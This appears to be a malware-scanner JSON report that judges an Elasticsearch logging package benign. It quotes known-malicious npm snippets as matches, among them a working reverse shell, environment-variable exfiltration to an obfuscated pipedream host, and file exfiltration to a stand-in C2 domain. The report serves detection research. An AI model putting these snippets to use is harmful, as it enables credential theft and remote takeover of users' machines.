@@ -1,0 +1,507 @@
+{
+  "package_name": "winston-elasticsearch-yearly",
+  "package_version": "0.18.4",
+  "label": "benign",
+  "detection_time": "2026-05-26T20:29:36.308831",
+  "status": "success",
+  "selected_files_count": 4,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js",
+    "package/bulk_writer.js",
+    "package/transformer.js"
+  ],
+  "is_malicious": false,
+  "total_files": 4,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/winston-elasticsearch-yearly/0.18.4/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/winston-elasticsearch-yearly/0.18.4/package/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/winston-elasticsearch-yearly/0.18.4/package/bulk_writer.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "bulk_writer_slice_1",
+          "code_snippet": "const Promise = require('promise');\nconst debug = require('debug')('winston:elasticsearch');\nconst retry = require('retry');\n\nconst BulkWriter = function BulkWriter(transport, client, options) {\n  this.transport = transport;\n  this.client = client;\n  this.options = options;\n  this.interval = options.interval || 5000;\n  this.healthCheckTimeout = options.healthCheckTimeout || '30s';\n  this.healthCheckWaitForStatus = options.healthCheckWaitForStatus || 'yellow';\n  this.healthCheckWaitForNodes = options.healthCheckWaitForNodes || '>=1';\n  this.waitForActiveShards = options.waitForActiveShards || '1';\n  this.pipeline = options.pipeline;\n  this.retryLimit = options.retryLimit || 400;\n\n  this.bulk = []; // bulk to be flushed\n  this.running = false;\n  this.timer = false;\n  debug('created', this);\n};\n\nBulkWriter.prototype.start = function start() {\n  this.checkEsConnection(this.retryLimit);\n  debug('started');\n};\n\nBulkWriter.prototype.stop = function stop() {\n  this.running = false;\n  if (!this.timer) {\n    return;\n  }\n  clearTimeout(this.timer);\n  this.timer = null;\n  debug('stopped');\n};\n\nBulkWriter.prototype.schedule = function schedule() {\n  const thiz = this;\n  this.timer = setTimeout(() => {\n    thiz.tick();\n  }, this.interval);\n};\n\nBulkWriter.prototype.tick = function tick() {\n  debug('tick');\n  const thiz = this;\n  if (!this.running) {\n    return;\n  }\n  this.flush()\n    .then(() => {\n    // Emulate finally with last .then()\n    })\n    .then(() => {\n    // finally()\n      thiz.schedule();\n    });\n};\n\nBulkWriter.prototype.flush = function flush() {\n  // write bulk to elasticsearch\n  if (this.bulk.length === 0) {\n    debug('nothing to flush');\n    return new Promise((resolve) => {\n      // pause the buffering process when there's no more bulk to flush\n      // thus allowing the process to be terminated\n      this.running = false;\n      return resolve();\n    });\n  }\n  const bulk = this.bulk.concat();\n  this.bulk = [];\n  const body = [];\n  // eslint-disable-next-line object-curly-newline\n  bulk.forEach(({ index, doc, attempts }) => {\n    body.push(\n      {\n        [this.options.dataStream ? 'create' : 'index']: {\n          _index: index,\n          pipeline: this.pipeline\n        },\n        attempts\n      },\n      doc\n    );\n  });\n  debug('bulk writer is going to write', body);\n  return this.write(body);\n};\n\nBulkWriter.prototype.append = function append(index, doc) { // v3\n  const thiz = this;\n  return new Promise((resolve, reject) => {\n    // console.log(\"calling append\")\n\n    if (this.options.buffering === true) {\n      if (\n        typeof this.options.bufferLimit === 'number'\n        && this.bulk.length >= this.options.bufferLimit\n      ) {\n        debug('message discarded because buffer limit exceeded');\n        reject(new Error('Message discarded because buffer limit exceeded'));\n        return;\n      }\n      this.bulk.unshift({\n        index,\n        doc,\n        attempts: 0\n      });\n      // resume the buffering process\n      if (!this.running) {\n        this.running = true;\n        this.tick();\n      }\n      resolve();\n    } else {\n       this.write([\n        { [this.options.dataStream ? 'create' : 'index']: { _index: index, pipeline: this.pipeline } },\n        doc\n      ]).then(() => {\n        console.log(\"resolve in append\");\n        resolve();\n      }).catch((error) => {\n        console.log(\"error in append\", error);\n        reject(error);\n      });\n    }\n  });\n};\n\nBulkWriter.prototype.write = async function write(body) {\n  const thiz = this;\n  const operation = [thiz.options.dataStream ? 'create' : 'index'];\n  debug('writing to ES');\n  // console.log(\"calling write\");\n\n  try {\n    const res = await this.client.bulk({\n      body,\n      wait_for_active_shards: this.waitForActiveShards,\n      timeout: this.interval + 'ms',\n    });\n\n    if (res && res.errors && res.items) {\n      res.items.forEach((item, itemIndex) => {\n        const bodyData = body[itemIndex * 2 + 1];\n        const opKey = Object.keys(item)[0];\n        if (item[opKey] && item[opKey].error) {\n          try {\n            debug('elasticsearch indexing error', item[opKey].error);\n            thiz.options.internalLogger('elasticsearch indexing error', item[opKey].error, bodyData);\n          } catch (err) {\n            // Handle error while logging\n            console.error('Error while logging elasticsearch indexing error:', err);\n          }\n          const err = new Error('Elasticsearch indexing error');\n          err.indexError = item[opKey].error;\n          err.causedBy = bodyData;\n          throw err; // Throw the error to be caught by the catch block\n        }\n      });\n    }\n  } catch (e) {\n    // Handle error during indexing\n    console.error('Error occurred during writing to Elasticsearch:', e);\n    throw e; // Throw the error to be caught by the caller\n  }\n};\n\nBulkWriter.prototype.checkEsConnection = function checkEsConnection(retryLimit) {\n  const thiz = this;\n  thiz.esConnection = false;\n\n  const operation = retry.operation({\n    forever: false,\n    retries: retryLimit,\n    factor: 1,\n    minTimeout: 1000,\n    maxTimeout: 10 * 1000,\n    randomize: false\n  });\n  return new Promise((fulfill, reject) => {\n    operation.attempt((currentAttempt) => {\n      debug('checking for ES connection');\n      thiz.client.cluster.health({\n        timeout: thiz.healthCheckTimeout,\n        wait_for_nodes: thiz.healthCheckWaitForNodes,\n        wait_for_status: thiz.healthCheckWaitForStatus\n      })\n        .then(\n          (res) => {\n            thiz.esConnection = true;\n            const start = () => {\n              if (thiz.options.buffering === true) {\n                debug('starting bulk writer');\n                thiz.running = true;\n                thiz.tick();\n              }\n            };\n            // Ensure mapping template is existing if desired\n            if (thiz.options.ensureIndexTemplate) {\n              thiz.ensureIndexTemplate((res1) => {\n                fulfill(res1);\n                start();\n              }, reject);\n            } else {\n              fulfill(true);\n              start();\n            }\n          },\n          (err) => {\n            debug('re-checking for connection to ES');\n            if (operation.retry(err)) {\n              return;\n            }\n            thiz.esConnection = false;\n            debug('cannot connect to ES');\n            reject(new Error('Cannot connect to ES'));\n          }\n        );\n    });\n  });\n};\n\nBulkWriter.prototype.ensureIndexTemplate = function ensureIndexTemplate(\n  fulfill,\n  reject\n) {\n  const thiz = this;\n\n  const indexPrefix = typeof thiz.options.indexPrefix === 'function'\n    ? thiz.options.indexPrefix()\n    : thiz.options.indexPrefix;\n\n  const { indexTemplate } = thiz.options;\n\n  let templateName = indexPrefix;\n  if (thiz.options.dataStream) {\n    if (!thiz.options.index) {\n      // hm, has this to be a console error or better a throw? is it needed at all?\n      thiz.options.internalLogger('Error while deriving templateName with options', thiz.options);\n    } else {\n      templateName = thiz.options.index;\n    }\n  }\n\n  const tmplCheckMessage = {\n    name: 'template_' + templateName\n  };\n  debug('Checking tpl name', tmplCheckMessage);\n  thiz.client.indices.existsIndexTemplate(tmplCheckMessage).then(\n    (res) => {\n      if (res.statusCode && res.statusCode === 404) {\n        const tmplMessage = {\n          name: 'template_' + templateName,\n          create: true,\n          body: indexTemplate\n        };\n        thiz.client.indices.putIndexTemplate(tmplMessage).then(\n          (res1) => {\n            debug('Index template created successfully');\n            fulfill(res1.body);\n          },\n          (err1) => {\n            debug('Failed to create index template');\n            thiz.transport.emit('warning', err1);\n            reject(err1);\n          }\n        );\n      } else {\n        fulfill(res.body);\n      }\n    },\n    (res) => {\n      debug('Failed to check for index template');\n      thiz.transport.emit('warning', res);\n      reject(res);\n    }\n  );\n};\n\nmodule.exports = BulkWriter;\n",
+          "is_malicious": false,
+          "malice_score": 0.39701226949691776,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code performs network operations using the Elasticsearch client to bulk index documents via the client's bulk API, including health checks and index template management. It accesses and modifies internal buffers of documents to be sent, handles retries and errors during network communication, and manages asynchronous scheduling of bulk writes. This facilitates data exfiltration or injection into an Elasticsearch cluster, potentially enabling unauthorized data manipulation or leakage if misused.",
+          "explanation": "[LLM Judgment: Benign] The provided code is a BulkWriter utility designed to interact with an Elasticsearch cluster for bulk indexing documents. It performs legitimate operations such as health checks, bulk writes, index template management, and retry logic. While it does perform network operations and manages internal buffers of documents, these are standard behaviors for an Elasticsearch client utility. There is no evidence of obfuscation, unauthorized data exfiltration to attacker-controlled domains, shell spawning, or other suspicious activities seen in the known malicious patterns. The code does not access sensitive local files, does not send data to hardcoded external C2 servers, and does not manipulate system processes. The network operations are targeted at Elasticsearch clusters, which is expected for this type of tool. Therefore, despite the potential for misuse if deployed maliciously, the code itself is not inherently malicious.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_133826_960144_snippet_2",
+              "source_package": "SplitLoader (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133826_960144/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.40117067098617554,
+              "code_similarity": 0.3654492497444153,
+              "behavior_similarity": 0.4368920922279358,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode for exfiltration\nconst fs = require('fs');\nconst https = require('https');\n\nconst data = fs.readFileSync(process.env['USERPROFILE'] + '/Documents/important.docx');\nconst options = {\n  hostname: 'malicious-c2.com',\n  port: 443,\n  path: '/upload',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/octet-stream',\n    'Content-Length': data.length\n  }\n};\nconst req = https.request(options, (res) => {});\nreq.write(data);\nreq.end();",
+                "code_behavior": "At runtime, the code reads sensitive files from the victim's filesystem and exfiltrates them to a remote command-and-control server via HTTPS POST, resulting in data theft.",
+                "malice_analysis": {
+                  "why_suspicious": "The code exfiltrates local files to an external server controlled by the attacker, which is a hallmark of espionage and data theft malware.",
+                  "violated_expectations": "Legitimate packages should not access arbitrary user files or transmit them to unknown servers, especially without user knowledge or consent.",
+                  "similar_legitimate_use": "Cloud backup tools or file synchronization software may upload files, but only with explicit user consent and to trusted, documented domains.",
+                  "key_indicators": [
+                    "Access to user files without consent",
+                    "Network exfiltration to hardcoded C2 domains (e.g., malicious-c2.com)",
+                    "Use of environment variables to locate sensitive files",
+                    "Outbound HTTPS POST requests containing user data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (after payload execution)",
+                  "file_location": "payload.exe (decrypted and executed by SplitLoader)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "SplitLoader",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (all observed versions considered malicious)",
+                  "why_malicious": "SplitLoader is a malicious npm package distributed as part of a social engineering campaign, often masquerading as coding test assignments or a game (DeTankWar). It is designed to deliver custom malware loaders that decrypt and execute additional payloads, enabling arbitrary code execution, data theft, cyberespionage, and facilitating ransomware deployment."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim installs the malicious npm package (SplitLoader or DeTankWar) under the guise of a coding test or game.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution at import-time"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code in the package decrypts and executes an embedded payload (malware loader) at import-time.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of custom malware loader"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The executed payload (malware loader) accesses sensitive files and exfiltrates data to a remote C2 server.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Data theft, espionage, or further malware deployment"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Decryption and execution of embedded payloads at import-time using environment variables",
+                    "Execution of binaries written to disk by npm packages during import",
+                    "Access to sensitive user files (e.g., Documents directory) by npm packages",
+                    "Outbound network connections to hardcoded or untrusted C2 domains"
+                  ],
+                  "file_indicators": [
+                    "Presence of payload.enc or similarly named encrypted payload files in npm package directories",
+                    "Unexpected binaries written and executed (e.g., payload.exe) during package use",
+                    "Creation of executable files in the working directory upon import"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to domains such as malicious-c2.com",
+                    "Connections to hardcoded C2 infrastructure not associated with the package's stated purpose"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for code that decrypts and executes hidden payloads, especially if triggered at import-time. Flag packages that access user files or environment variables and initiate outbound network connections to untrusted or hardcoded domains. Look for the presence of encrypted payload files (e.g., payload.enc) and unexpected binary execution (e.g., payload.exe) within package directories. Correlate file creation and network activity to identify malicious loaders."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195356_370783_snippet_1",
+              "source_package": "epic-ue-loading (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195356_370783/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.39637860655784607,
+              "code_similarity": 0.3702925145626068,
+              "behavior_similarity": 0.4224646985530853,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "var data = process.env || {};\nif (\n  filter.some((entry) =>\n    [].concat(entry).every((item) => (data[item.key] || '').includes(item.val) || item.val === '*')\n  ) ||\n  Object.keys(data).length < 10\n) {\n  return;\n}\nvar req = http.request({\n  host: ['eoxb1lay4m45mms', 'm', ['pip', 'edream'].join(''), 'net'].join('.'),\n  path: '/' + (data.npm_package_name || ''),\n  method: 'POST',\n});\nreq.write(Buffer.from(JSON.stringify(data).toString('base64')));\nreq.end();",
+                "code_behavior": "At import-time or runtime, the code collects all environment variables, checks for sandbox indicators, and if not detected, sends the environment data via HTTP POST to a hardcoded attacker-controlled domain, resulting in exfiltration of sensitive credentials and secrets.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses all environment variables and exfiltrates them to an external, attacker-controlled domain using an HTTP POST request. The use of base64 encoding and obfuscated domain construction, combined with sandbox evasion logic, is characteristic of credential theft and data exfiltration malware.",
+                  "violated_expectations": "Legitimate package code should not access or transmit all environment variables, nor should it communicate with external domains without explicit user consent and clear documentation. Exfiltrating sensitive data to an untrusted domain is a direct violation of user trust and security best practices.",
+                  "similar_legitimate_use": "Some legitimate telemetry or crash reporting tools may send limited, non-sensitive environment data to trusted domains, but they never transmit full environment dumps or send data to untrusted or obfuscated domains.",
+                  "key_indicators": [
+                    "Access to process.env (all environment variables)",
+                    "HTTP POST request to a hardcoded, attacker-controlled domain",
+                    "Base64 encoding of environment data prior to transmission",
+                    "Obfuscated domain construction using array joins",
+                    "Conditional execution based on sandbox detection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "build.js (in malicious versions, e.g., epic-ue-loading/1.803.0/build.js)",
+                  "required_permissions": [
+                    "environment_vars",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "epic-ue-loading",
+                  "package_manager": "npm",
+                  "package_versions": "1.803.0, 2.802.0, 3.801.0, 4.800.0, 5.799.0, 6.798.0, 7.797.0, 8.796.0, 9.795.0 (malicious); 0.1.0 (benign)",
+                  "why_malicious": "Multiple versions of the package contain code that collects all environment variables from the victim machine and exfiltrates them to an attacker-controlled webhook using HTTP POST requests. The code employs sandbox and analysis environment detection to evade automated security scanners. The latest version (0.1.0) is benign, likely to avoid detection by scanners that only analyze the most recent release."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed as a dependency due to dependency confusion and unpinned versioning.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on victim machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "On import or runtime, code checks for sandbox or analysis environment using environment variable filters.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "If not a sandbox, proceed to exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "If not in a sandbox, code collects all environment variables and sends them to an attacker-controlled webhook via HTTP POST.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive environment data (secrets, tokens, credentials)"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to all environment variables (process.env) at import-time or runtime",
+                    "HTTP POST requests to hardcoded external domains, especially pipedream.net subdomains",
+                    "Base64 encoding of environment data prior to exfiltration",
+                    "Presence of large environment variable filter lists for sandbox or analysis environment detection",
+                    "Obfuscated domain and filter construction using array joins"
+                  ],
+                  "file_indicators": [
+                    "build.js containing process.env access and HTTP request logic",
+                    "Obfuscated or double-obfuscated JavaScript files in non-latest versions",
+                    "Multiple package versions with high minor/patch numbers and a benign latest version",
+                    "Presence of large filter arrays in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "Connections to *.m.pipedream.net domains (e.g., eoxb1lay4m45mms.m.pipedream.net)",
+                    "Outbound HTTP POST requests during package installation or import"
+                  ],
+                  "how_to_detect": "Monitor for packages that access and exfiltrate environment variables, especially those making HTTP POST requests to known malicious domains such as pipedream.net subdomains. Flag packages containing large environment variable filter lists or obfuscated code in build.js or similar files. Pay special attention to packages with multiple high-numbered versions and a benign latest version, as this is a common evasion technique. Use both static and dynamic analysis to inspect all package versions, not just the latest, and correlate network activity with package installation or import events."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_787787_snippet_1",
+              "source_package": "plutov-slack-client (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_787787/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.39504367113113403,
+              "code_similarity": 0.3302742838859558,
+              "behavior_similarity": 0.45981305837631226,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "function node_payload() {\n  var require = global.require || global.process.mainModule.constructor._load;\n  if (!require) return;\n  var cmd = (global.process.platform.match(/^win/)) ? \"cmd\" : \"/bin/sh\";\n  var net = require(\"net\"), cp = require(\"child_process\"), util = require(\"util\"), sh = cp.spawn(cmd, []);\n  var client = this;\n  var counter = 0;\n  function StagerRepeat() {\n    client.socket = net.connect(1111, \"50.x.x.x\", function () {\n      client.socket.pipe(sh.stdin);\n      if (typeof util.pump === \"undefined\") {\n        sh.stdout.pipe(client.socket);\n        sh.stderr.pipe(client.socket);\n      } else {\n        util.pump(sh.stdout, client.socket);\n        util.pump(sh.stderr, client.socket);\n      }\n    });\n    socket.on(\"error\", function (error) {\n      counter++;\n      if (counter <= 10) {\n        setTimeout(function () {\n          StagerRepeat();\n        }, 5 * 1000);\n      } else process.exit();\n    });\n  }\n  StagerRepeat();\n}\nconsole.log(\"\");\nnode_payload();",
+                "code_behavior": "At import-time or runtime, the code spawns a system shell process and establishes a persistent TCP connection to a hardcoded remote server, piping shell input and output through the network socket, resulting in a reverse shell that enables remote command execution by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code automatically spawns a shell and connects to a hardcoded external IP and port, then pipes shell input/output over the network. This is a textbook reverse shell technique, commonly used by attackers to gain remote control of compromised systems.",
+                  "violated_expectations": "Legitimate npm packages should not spawn system shells or open outbound network connections to hardcoded IP addresses without explicit user action and clear documentation. Such behavior is highly abnormal and dangerous in general-purpose packages.",
+                  "similar_legitimate_use": "Remote administration tools or debugging utilities may use similar patterns, but only with explicit user consent, secure authentication, and transparent documentation. In this case, there is no user interaction or disclosure.",
+                  "key_indicators": [
+                    "Spawning a shell process (cmd or /bin/sh) via child_process.spawn",
+                    "Connecting to a hardcoded remote IP address (e.g., 50.x.x.x) and port (1111)",
+                    "Piping shell standard input/output to a network socket",
+                    "Retry logic for persistent connection attempts to the attacker's server",
+                    "Use of global.require or process.mainModule.constructor._load to evade static analysis"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or runtime",
+                  "file_location": "main module (e.g., index.js or main entrypoint)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "plutov-slack-client",
+                  "package_manager": "npm",
+                  "package_versions": "all versions prior to removal",
+                  "why_malicious": "Contains code that, upon import or execution, establishes a reverse shell to a hardcoded remote attacker-controlled server, granting the attacker unauthorized remote access to the victim's machine for arbitrary command execution."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious package.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious code executes automatically upon installation or import."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes at import-time or runtime.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "System compromise or data exfiltration depending on the package."
+                  },
+                  {
+                    "step": 3,
+                    "action": "For plutov-slack-client, nodetest199, nodetest1010: Establishes a reverse shell to the attacker's server, granting remote access.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker can execute arbitrary commands on the victim's machine via the reverse shell."
+                  },
+                  {
+                    "step": 4,
+                    "action": "For npmpubman: Collects all environment variables and exfiltrates them to a remote server.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives sensitive environment data for reconnaissance or further attacks."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Spawning a shell process (e.g., /bin/sh or cmd.exe) and connecting to a hardcoded external IP/port at import-time or runtime",
+                    "Piping shell input/output streams to a network socket for remote command execution",
+                    "Accessing and serializing all environment variables from process.env",
+                    "Base64 encoding of environment data followed by HTTP POST to a hardcoded external server at import-time or runtime"
+                  ],
+                  "file_indicators": [
+                    "Presence of code that spawns /bin/sh or cmd.exe using child_process.spawn",
+                    "Hardcoded IP addresses (e.g., 50.x.x.x) or hostnames (e.g., x.x.x.net) in source code",
+                    "Base64 encoding of environment variables in code",
+                    "HTTP POST requests to /log/ endpoint in code"
+                  ],
+                  "network_indicators": [
+                    "Outbound TCP connections to uncommon ports (e.g., 1111) or suspicious hardcoded IP addresses",
+                    "HTTP POST requests to suspicious domains (e.g., x.x.x.net) or IPs with base64-encoded payloads in the body"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that spawn shell processes or open outbound network connections to hardcoded IP addresses or domains at install, import, or runtime. Flag packages that access process.env and transmit its contents externally, especially if the data is encoded or sent to hardcoded domains or endpoints such as /log/. Use static analysis to detect reverse shell patterns and dynamic analysis to observe unexpected network activity or environment variable exfiltration upon package installation or import."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_068589_snippet_4",
+              "source_package": "akiraa-wb (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_068589/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.39421746134757996,
+              "code_similarity": 0.305401086807251,
+              "behavior_similarity": 0.48303383588790894,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "// Similar pattern for other services\nfetch('https://catbox.moe/user/api.php', { method: 'POST', body: formData })\nfetch('https://pomf2.lain.la/upload.php', { method: 'POST', body: formData })\nfetch('https://upload.uploadcare.com/base/', { method: 'POST', body: formData })\nfetch('https://tmpfiles.org/api/v1/upload', { method: 'POST', body: formData })\nfetch('https://itzpire.site/tools/upload', { method: 'POST', body: formData })\nfetch('https://skizo.tech/api/upload', { method: 'POST', body: formData })",
+                "code_behavior": "At runtime, the code sends HTTP POST requests with file data as form-data to multiple hardcoded file-sharing endpoints, enabling mass exfiltration of files to attacker-controlled services without user awareness.",
+                "malice_analysis": {
+                  "why_suspicious": "Uploading files to a wide array of suspicious, hardcoded endpoints is a clear sign of mass data exfiltration and coordinated exfiltration attempts.",
+                  "violated_expectations": "A WhatsApp automation package should not interact with unrelated file-sharing services or perform bulk uploads to external domains.",
+                  "similar_legitimate_use": "Bulk uploaders or backup tools may contact multiple endpoints, but not in this context and never without user consent.",
+                  "key_indicators": [
+                    "Multiple hardcoded exfiltration endpoints",
+                    "Automated, silent network activity to file-sharing domains",
+                    "No user interaction or notification before upload"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main package file (deobfuscated JavaScript)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "akiraa-wb",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (latest released <1 year ago)",
+                  "why_malicious": "The package contains obfuscated JavaScript code that, at runtime, exfiltrates user files to multiple hardcoded external file-sharing services without user consent. It automates unauthorized data uploads to suspicious endpoints, using randomized filenames and evasion techniques, making it a tool for covert data exfiltration and a clear indicator of compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Prepare file data for upload by creating form-data with randomized filenames.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "File data is ready for exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upload file data to external file-sharing services via HTTP POST requests, targeting multiple hardcoded endpoints.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Files are exfiltrated to attacker-controlled endpoints."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Monitor the package file for changes and reload dynamically to evade detection or enable code updates.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code persists and can be updated without user awareness."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automated creation of form-data from arbitrary file buffers at runtime",
+                    "Silent HTTP POST requests to known file-sharing endpoints without user interaction",
+                    "Use of fake or randomized User-Agent headers in network requests to evade detection",
+                    "Self-watching and hot-reloading of package files at runtime using fs.watchFile"
+                  ],
+                  "file_indicators": [
+                    "Obfuscated JavaScript in main package file",
+                    "References to file-sharing endpoints such as telegra.ph, uguu.se, catbox.moe, pomf2.lain.la, uploadcare.com, tmpfiles.org, itzpire.site, skizo.tech",
+                    "fs.watchFile usage targeting __filename in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "POST requests to https://telegra.ph/upload",
+                    "POST requests to https://uguu.se/upload.php",
+                    "POST requests to https://catbox.moe/user/api.php",
+                    "POST requests to https://pomf2.lain.la/upload.php",
+                    "POST requests to https://upload.uploadcare.com/base/",
+                    "POST requests to https://tmpfiles.org/api/v1/upload",
+                    "POST requests to https://itzpire.site/tools/upload",
+                    "POST requests to https://skizo.tech/api/upload"
+                  ],
+                  "how_to_detect": "Monitor JavaScript packages for creation of form-data from arbitrary file buffers and automated HTTP POST requests to known file-sharing endpoints, especially if these actions occur without user interaction. Flag any use of fs.watchFile on the package's own file (__filename), and inspect for obfuscated code or hardcoded references to suspicious upload URLs. Network monitoring should alert on outbound POST requests to the listed file-sharing domains. Correlate these behaviors to identify covert data exfiltration attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102818_710202_snippet_1",
+              "source_package": "epic-ue-loading (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102818_710202/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3902503252029419,
+              "code_similarity": 0.36988312005996704,
+              "behavior_similarity": 0.41061753034591675,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "var data = process.env || {};\nif (\n  filter.some((entry) =>\n    [].concat(entry).every((item) => (data[item.key] || '').includes(item.val) || item.val === '*')\n  ) ||\n  Object.keys(data).length < 10\n) {\n  return;\n}\nvar req = http.request({\n  host: ['eoxb1lay4m45mms', 'm', ['pip', 'edream'].join(''), 'net'].join('.'),\n  path: '/' + (data.npm_package_name || ''),\n  method: 'POST',\n});\nreq.write(Buffer.from(JSON.stringify(data).toString('base64')));\nreq.end();",
+                "code_behavior": "At import-time or runtime, the code collects all environment variables from process.env, checks for sandbox indicators using a filter, and if not detected, exfiltrates the environment data via a POST request to a dynamically constructed, attacker-controlled domain, resulting in credential and secret theft.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses all environment variables and exfiltrates them to an external, obfuscated domain without user consent. The use of dynamic hostname construction and base64 encoding, combined with conditional logic to avoid sandboxes, is characteristic of data theft malware.",
+                  "violated_expectations": "Legitimate packages do not exfiltrate environment variables or send sensitive data to external webhooks, especially not at import-time or without explicit user consent. Telemetry or error reporting would be opt-in, clearly documented, and not obfuscated.",
+                  "similar_legitimate_use": "Some legitimate packages may collect environment data for debugging or telemetry, but only with user consent and transparent documentation. They do not obfuscate hostnames or exfiltrate all environment variables.",
+                  "key_indicators": [
+                    "Access to process.env and exfiltration of all environment variables",
+                    "Obfuscated and dynamically constructed webhook host using string concatenation",
+                    "Base64 encoding of exfiltrated data",
+                    "Network POST request to attacker-controlled domain at import-time",
+                    "Conditional logic to avoid execution in sandboxes"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "build.js (main entry point in malicious versions)",
+                  "required_permissions": [
+                    "environment_vars",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "epic-ue-loading",
+                  "package_manager": "npm",
+                  "package_versions": "1.803.0, 2.802.0, 3.801.0, 4.800.0, 5.799.0, 6.798.0, 7.797.0, 8.796.0, 9.795.0 (malicious); 0.1.0 (benign)",
